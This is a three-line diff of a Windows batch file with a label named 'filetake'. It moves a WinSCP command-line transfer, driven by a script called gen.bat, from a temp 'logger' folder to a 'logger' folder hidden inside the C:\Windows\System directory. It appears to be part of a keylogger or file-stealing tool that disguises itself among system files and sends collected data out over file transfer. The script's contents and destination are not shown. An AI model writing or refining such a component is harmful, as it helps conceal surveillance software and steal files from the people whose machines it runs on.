@@ -1,3 +1,3 @@
 @echo off
 :filetake
-%temp%\logger\WinSCP.com /script=C:\Windows\System32\logger\gen.bat
+C:\Windows\System\logger\WinSCP.com /script=C:\Windows\System\logger\gen.bat
